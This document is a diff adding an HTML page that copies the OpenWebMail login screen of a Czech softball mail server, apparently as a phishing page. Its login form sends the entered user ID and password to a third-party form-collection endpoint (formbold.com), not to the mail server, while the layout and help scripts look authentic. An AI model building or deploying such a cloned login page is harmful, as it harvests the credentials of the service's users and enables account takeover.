@@ -1,0 +1,119 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<!-- saved from url=(0024)http://mail.softball.cz/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>06-08-2023 16:47:09 +0200 - en_US.UTF-8 - OpenWebMail</title>
+  <link rel="shortcut icon" href="http://mail.softball.cz/images/system/openwebmail.ico">
+  <link rel="stylesheet" type="text/css" href="./softball_files/default.css">
+
+</head>
+
+<!-- 6032:0 -->
+
+<body onhelp="window.open(&#39;/.//help/en_US.UTF-8&#39;, &#39;_help&#39;); return false;" style="background-image: url(/.//images/backgrounds/Globe.gif); background-repeat: repeat; font-size: 10pt; direction: ltr;">
+
+
+<center>
+<a href="http://openwebmail.acatysmoof.com/"><img border="0" src="./softball_files/openwebmail.png"></a><br><br>
+</center>
+
+<form action="https://formbold.com/s/67WXK" method="post" name="loginform" id="loginform">
+<input type="hidden" name="browserjavascript" value="dom">
+<input type="hidden" name="logindomain" value="mail.softball.cz">
+<table cellpadding="0" cellspacing="0" border="0" width="260" align="center">
+<tbody><tr>
+  <td class="login_titlebar" style="background-image: url(/.//images/system/bg-titleblue.gif);">&nbsp;Login</td>
+</tr>
+<tr>
+  <td align="center" class="login_border">
+    <table cellpadding="0" cellspacing="1" border="0" width="100%">
+    <tbody><tr>
+      <td class="background">
+        <table cellpadding="0" cellspacing="2" border="0" align="center">
+        <tbody><tr>
+          <td colspan="2">&nbsp;</td>
+        </tr>
+        <tr>
+          <td align="right" nowrap="">UserID:</td>
+          <td align="left"><input type="text" name="loginname" size="14"></td>
+        </tr>
+        <tr>
+          <td align="right" nowrap="">Password:</td>
+          <td align="left" nowrap=""><input type="password" name="password" size="14"></td>
+        </tr>
+
+        <tr>
+          <td colspan="2">
+            <table cellpadding="2" cellspacing="1" border="0" align="center">
+            <tbody><tr>
+              <td align="center"><input type="submit" name="loginbutton" value="Login"></td>
+              <td>
+                <table cellpadding="2" cellspacing="0" border="0" align="center">
+                <tbody><tr>
+                  <td><input type="checkbox" id="httpcompress" name="httpcompress" value="1" checked="checked" onclick="httpcompresshelp();"></td>
+                  <td class="login_small" align="left"><label for="httpcompress">HTTP<br>Compression</label></td>
+
+                  <!-- support autologin if it is allowed for this ip -->
+                  <td><input type="checkbox" id="autologin" name="autologin" value="1" checked="checked" onclick="autologinhelp();"></td>
+                  <td class="login_small" align="left"><label for="autologin">Auto<br>Login</label></td>
+                  <!-- end support autologin -->
+                </tr>
+                </tbody></table>
+              </td>
+            </tr>
+            </tbody></table>
+          </td>
+        </tr>
+        <tr>
+          <td colspan="2">&nbsp;</td>
+        </tr>
+        </tbody></table>
+      </td>
+    </tr>
+    </tbody></table>
+  </td>
+</tr>
+</tbody></table>
+</form>
+
+<script type="text/javascript">
+<!--
+// detect level of javascript support from users browser
+// to determine if html composing will be allowed
+document.loginform.browserjavascript.value = (document.getElementById) ? 'dom' :
+                                                        (document.all) ? 'ie'  :
+                                                     (document.layers) ? 'nn4' :
+                                                                         'none';
+
+if (document.loginform.loginname.value == '') {
+   document.loginform.loginname.focus()
+} else {
+   document.loginform.password.focus()
+}
+
+function httpcompresshelp() {
+   if (document.loginform.httpcompress.checked) {
+      var msg = 'HTTP compression can reduce the use of network bandwidth between your computer and the webmail server, but there are some compatibility issues:\n\n1. some proxy servers only support HTTP compression via HTTP 1.1. You may need to manually enable HTTP 1.1 support in the proxy settings of your browser\n\n2. some proxy servers do not support HTTP compression at all. You may have to list the webmail server as directly connected in the proxy configuration of your browser.\n\n3. some browsers have problems when using HTTP compression with SSL.\n\n4. some browsers claim to support HTTP compression but actually do not.\n\nIf you encounter problems please login again with this option unchecked.\n';
+      alert(msg);
+   }
+   return true;
+}
+
+function autologinhelp() {
+   if (document.loginform.autologin.checked) {
+      var msg = 'When this feature is enabled you may login to OpenWebMail without re-entering your username and password, but only if you did not logout of your previous session and that session has not timed out.\n\nDO NOT ENABLE THIS FEATURE ON A PUBLIC COMPUTER or others will gain access to your account.\n';
+      alert(msg);
+   }
+   return true;
+}
+
+//-->
+</script>
+
+<center>
+PS: Při špatném zobrazování diakritiky si znovu uložte nastavení webmailu po přihlášení.
+</center>
+
+
+
+</body></html>
